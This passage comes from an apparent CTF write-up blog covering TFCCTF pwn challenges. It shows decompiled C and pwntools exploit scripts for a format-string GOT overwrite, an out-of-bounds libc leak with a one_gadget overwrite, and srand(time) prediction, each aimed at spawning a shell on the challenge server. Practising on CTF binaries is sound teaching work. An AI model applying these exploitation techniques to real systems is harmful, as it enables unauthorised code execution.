class="string">&#x27;./shello-world&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        p = process()</span><br><span class="line">        payload = <span class="string">&#x27;AAAAAAAA,%&#123;i&#125;$p&#x27;</span>.<span class="built_in">format</span>(i=i)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="built_in">print</span>(p.recvall(), i)</span><br></pre></td></tr></table></figure><p><img src="/imgs/post6/pwn/shello-world_ps.png" alt="shello-world_ps.png"></p><h4 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./shello-world&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process()</span></span><br><span class="line">p = remote(<span class="string">&quot;challs.tfcctf.com&quot;</span>,<span class="number">32419</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">got_ow</span>():</span><br><span class="line">    payload = &#123;</span><br><span class="line">                elf.got.putchar: elf.sym.win</span><br><span class="line">            &#125;</span><br><span class="line">    payload = fmtstr_payload(<span class="number">6</span>,payload,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload </span><br><span class="line"></span><br><span class="line">payload = got_ow() </span><br><span class="line"><span class="comment">#p.recvuntil(&quot;me? : &quot;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure><p>reference  : <a href="https://axcheron.github.io/exploit-101-format-strings/">https://axcheron.github.io/exploit-101-format-strings/</a> </p><h3 id="Easy-ROP"><a href="#Easy-ROP" class="headerlink" title="Easy ROP"></a>Easy ROP</h3><h5 id="main-func"><a href="#main-func" class="headerlink" title="main func"></a>main func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"> 2</span><br><span class="line"> 3&#123;</span><br><span class="line"> <span class="number">4</span>  undefined4 uVar1;</span><br><span class="line"> <span class="number">5</span>  <span class="type">long</span> i;</span><br><span class="line"> <span class="number">6</span>  undefined8 *puVar2;</span><br><span class="line"> <span class="number">7</span>  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line"> <span class="number">8</span>  byte bVar3;</span><br><span class="line"> <span class="number">9</span>  <span class="type">int</span> local_214;</span><br><span class="line"><span class="number">10</span>  undefined4 local_210;</span><br><span class="line"><span class="number">11</span>  uint local_20c;</span><br><span class="line"><span class="number">12</span>  undefined8 local_208 [<span class="number">63</span>];</span><br><span class="line"><span class="number">13</span>  <span class="type">long</span> local_10;</span><br><span class="line"><span class="number">14</span>  </span><br><span class="line"><span class="number">15</span>  bVar3 = <span class="number">0</span>;</span><br><span class="line"><span class="number">16</span>  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line"><span class="number">17</span>  setup();</span><br><span class="line"><span class="number">18</span>  puVar2 = local_208;</span><br><span class="line"><span class="number">19</span>  <span class="keyword">for</span> (i = <span class="number">62</span>; i != <span class="number">0</span>; i = i + <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="number">20</span>    *puVar2 = <span class="number">0</span>;</span><br><span class="line"><span class="number">21</span>    puVar2 = puVar2 + (ulong)bVar3 * <span class="number">-2</span> + <span class="number">1</span>;</span><br><span class="line"><span class="number">22</span>  &#125;</span><br><span class="line"><span class="number">23</span>  *(undefined4 *)puVar2 = <span class="number">0</span>;</span><br><span class="line"><span class="number">24</span>  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line"><span class="number">25</span>    <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line"><span class="number">26</span>      local_210 = <span class="number">0</span>;</span><br><span class="line"><span class="number">27</span>      local_20c = <span class="number">0</span>;</span><br><span class="line"><span class="number">28</span>      <span class="built_in">puts</span>(<span class="string">&quot;Welcome to easyrop!&quot;</span>);</span><br><span class="line"><span class="number">29</span>      <span class="built_in">puts</span>(<span class="string">&quot;Press \&#x27;1\&#x27; to write and \&#x27;2\&#x27; to read!&quot;</span>);</span><br><span class="line"><span class="number">30</span>      __isoc99_scanf(&amp;DAT_00402017,&amp;local_214);</span><br><span class="line"><span class="number">31</span>      <span class="keyword">if</span> (local_214 != <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="number">32</span>      local_20c = get_index();</span><br><span class="line"><span class="number">33</span>      uVar1 = get_number();</span><br><span class="line"><span class="number">34</span>      *(undefined4 *)((<span class="type">long</span>)local_208 + (ulong)local_20c * <span class="number">4</span>) = uVar1;</span><br><span class="line"><span class="number">35</span>    &#125;</span><br><span class="line"><span class="number">36</span>    <span class="keyword">if</span> (local_214 != <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="number">37</span>    local_20c = get_index();</span><br><span class="line"><span class="number">38</span>    <span class="built_in">printf</span>(<span class="string">&quot;The number at index %d is %x\n&quot;</span>,(ulong)local_20c,</span><br><span class="line"><span class="number">39</span>           (ulong)*(uint *)((<span class="type">long</span>)local_208 + (ulong)local_20c * <span class="number">4</span>));</span><br><span class="line"><span class="number">40</span>  &#125;</span><br><span class="line"><span class="number">41</span>  <span class="built_in">puts</span>(<span class="string">&quot;Bye :(&quot;</span>);</span><br><span class="line"><span class="number">42</span>  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line"><span class="number">43</span>                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line"><span class="number">44</span>    __stack_chk_fail();</span><br><span class="line"><span class="number">45</span>  &#125;</span><br><span class="line"><span class="number">46</span>  <span class="keyword">return</span>;</span><br><span class="line"><span class="number">47</span>&#125;</span><br></pre></td></tr></table></figure><p>so function’s functionality is like</p><ul><li>provides to two options 1 and 2 for read and write sequentially </li><li>that takes index and content(number) to write </li><li>that being stored on variable local_208 corresponding to given index</li></ul><p>so bug spotted in line number 38 as we can see that variable <strong>local_208’s</strong> address being printed using %x format specifier, it seems that we may get libc address that will help us to calculate the base address, lets find out the offset </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./easyrop&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level  = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&quot;read!\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">300</span>):</span><br><span class="line">       <span class="keyword">if</span> i % <span class="number">3</span> != <span class="number">0</span>:</span><br><span class="line">           r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">           r.sendlineafter(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">           <span class="built_in">print</span>(r.recvline())</span><br><span class="line">    </span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><blockquote><p>using that <strong>if</strong> condition thing ‘cause of restriction we have in <code>get_index</code> function i.e.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">uint <span class="title function_">get_index</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  uint local_14;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  fwrite(<span class="string">&quot;Select index: &quot;</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00402017,&amp;local_14);</span><br><span class="line">  <span class="keyword">if</span> (local_14 % <span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope! Can\&#x27;t give u that one!&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> local_14;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>and here we go! </p><p><img src="/imgs/post6/pwn/easy_rop_leak.png" alt="easy_rop_leak.png"></p><blockquote><p>address is printed in two half parts as we have seen in main function i.e. </p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ulong)*(uint *)((<span class="type">long</span>)local_208 + (ulong)local_20c * <span class="number">4</span>));</span><br></pre></td></tr></table></figure><p>that is basically equivalent to local_208[i*4] </p><h4 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./easyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">conitnue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = conn() </span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;130&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot; is &quot;</span>)</span><br><span class="line">    leak2=io.recvline().strip()</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;131&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot; is &quot;</span>)</span><br><span class="line">    leak1=io.recvline().strip()</span><br><span class="line"></span><br><span class="line">    leak = <span class="built_in">int</span>(<span class="string">b&quot;0x&quot;</span>+leak1+leak2,<span class="number">16</span>) - <span class="number">0x2718a</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;LEAK&quot;</span>,<span class="built_in">hex</span>(leak),leak1,leak2)</span><br><span class="line"></span><br><span class="line">    gadget = leak + <span class="number">0xebcf8</span> <span class="comment">#one_gadget</span></span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;130&quot;</span>)</span><br><span class="line">    pl=<span class="built_in">str</span>(gadget&amp;<span class="number">0x00000000ffffffff</span>)</span><br><span class="line">    io.sendline(pl.encode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;part1&quot;</span>,<span class="built_in">hex</span>(<span class="built_in">int</span>(pl)))</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;131&quot;</span>)</span><br><span class="line">    pl=<span class="built_in">str</span>(gadget&gt;&gt;<span class="number">32</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;part2&quot;</span>,<span class="built_in">hex</span>(<span class="built_in">int</span>(pl)))</span><br><span class="line">    io.sendline(pl.encode())</span><br><span class="line">    </span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.interactive() </span><br></pre></td></tr></table></figure><p>gadget&amp;0x00000000ffffffff and gadget&gt;&gt;32 is used to send the address in two half as it takes only 4 bytes at a time so first half lower bytes and then rest higher bytes sequentially</p><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><h5 id="main-func-1"><a href="#main-func-1" class="headerlink" title="main func"></a>main func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">time_t</span> tVar2;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> j;</span><br><span class="line">  <span class="type">int</span> counter;</span><br><span class="line">  </span><br><span class="line">  setup();</span><br><span class="line">  tVar2 = time((<span class="type">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">  srand((uint)tVar2);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">    iVar1 = rand();</span><br><span class="line">    *(<span class="type">int</span> *)(v + (<span class="type">long</span>)i * <span class="number">4</span>) = iVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Guess my numbers!&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j = j + <span class="number">1</span>) &#123;</span><br><span class="line">    __isoc99_scanf(&amp;DAT_0010201e,input + (<span class="type">long</span>)j * <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  counter = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">9</span> &lt; counter) &#123;</span><br><span class="line">      win();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)(v + (<span class="type">long</span>)counter * <span class="number">4</span>) != *(<span class="type">int</span> *)(input + (<span class="type">long</span>)counter * <span class="number">4</span>)) <span class="keyword">break</span>;</span><br><span class="line">    counter = counter + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You didn\&#x27;t make it :(&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>function workflow :</p><ul><li>Loop1: generates 10 random integer values using the <code>rand</code> function and stores them in an array-like structure starting from the memory address <code>v</code>. The use of the <code>time</code> function to seed the random number generator ensures that each time the program is run, it produces a different sequence of random values.</li><li>Loop2: let user to guess numbers</li><li>Loop3: compare the user given number to random generated number one by one if each and every number that being generated randomly in first loop is equal to user guessed numbers that it will call the <code>win</code> function that contain spwan the shell</li></ul><p>so all we have to do is somehow generate the exact numbers that being generated by program</p><p>we can replicate the process in python using <strong>cytpes</strong> library</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> CDLL</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./random&#x27;</span>) </span><br><span class="line">libc = CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = process()</span><br><span class="line"><span class="comment">#io = remote(&#x27;challs.tfcctf.com&#x27;,31094)</span></span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">nbs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    nbs.append(libc.rand())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Guess my numbers!\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> nbs:</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwngate"><a href="#pwngate" class="headerlink" title="pwngate"></a>pwngate</h3><p>this challenge is pretty fun to solve, lets disassemble the program and follow through each function </p><h5 id="main-func-2"><a href="#main-func-2" class="headerlink" title="main func"></a>main func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your current timeline is horrible.&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;In order to reach the Pwn;Gate you are ready to sacrifice everything...\n&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  setup();</span><br><span class="line">  current_leap();</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="menu-func"><a href="#menu-func" class="headerlink" title="menu func"></a>menu func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined4 local_11;</span><br><span class="line">  undefined local_d;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  fgets(timeline,<span class="number">0xf</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">      <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">        <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;\nWhat are you going to do?&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;-------------------------&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[1] Try to change the timeline&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[2] Time leap&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[3] Ensure your sanity&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[4] Remember who you are&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[5] Exit&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;-------------------------&quot;</span>);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Enter choice: &quot;</span>);</span><br><span class="line">          local_11 = <span class="number">0</span>;</span><br><span class="line">          local_d = <span class="number">0</span>;</span><br><span class="line">          fgets((<span class="type">char</span> *)&amp;local_11,<span class="number">5</span>,<span class="built_in">stdin</span>);</span><br><span class="line">          local_c = atoi((<span class="type">char</span> *)&amp;local_11);</span><br><span class="line">          <span class="keyword">if</span> (local_c != <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">          divergence_meter();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (local_c != <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line">        timeleap();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (local_c != <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> (leveling._0_4_ == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You are sane.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        sanity();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (local_c == <span class="number">5</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (local_c == <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (leveling._4_4_ == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You didn\&#x27;t play the game yet! 